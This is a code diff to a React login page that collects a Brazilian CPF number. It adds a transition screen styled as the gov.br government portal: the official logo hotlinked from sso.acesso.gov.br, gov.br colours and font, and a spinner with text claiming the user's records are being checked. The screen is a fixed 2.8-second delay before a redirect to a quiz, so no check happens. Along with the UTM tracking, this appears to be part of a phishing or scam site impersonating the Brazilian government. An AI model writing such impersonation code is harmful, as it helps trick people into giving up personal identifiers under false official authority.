@@ -89,6 +89,7 @@ const Login: React.FC = () => {
   const [cpf, setCpf] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [showTransition, setShowTransition] = useState(false);
   const navigate = useUtmNavigator();
   const { setUserName, setUserData } = useUser();
 
@@ -137,13 +138,32 @@ const Login: React.FC = () => {
         });
       }
 
-      navigate('/quiz');
+      setShowTransition(true);
+      setTimeout(() => navigate('/quiz'), 2800);
     } catch (error) {
       setError('Erro ao validar CPF. Tente novamente.');
     } finally {
       setLoading(false);
     }
   };
+
+  if (showTransition) {
+    return (
+      <div className="fixed inset-0 flex flex-col items-center justify-center" style={{ background: '#1351B4', fontFamily: 'Rawline, sans-serif' }}>
+        {/* SVG pattern overlay */}
+        <div className="absolute inset-0" style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")` }} />
+        {/* Content */}
+        <div className="relative z-10 flex flex-col items-center text-white text-center px-8">
+          <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr-colorido-b.png" alt="Gov.br" style={{ width: 120, marginBottom: 40, filter: 'brightness(0) invert(1)' }} />
+          {/* Spinner */}
+          <div style={{ width: 56, height: 56, border: '4px solid rgba(255,255,255,0.25)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.9s linear infinite', marginBottom: 32 }} />
+          <h2 style={{ fontSize: 20, fontWeight: 700, marginBottom: 8 }}>Verificando seus dados</h2>
+          <p style={{ fontSize: 14, opacity: 0.8 }}>Aguarde, estamos consultando seu cadastro...</p>
+        </div>
+        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: 1.5 }}>
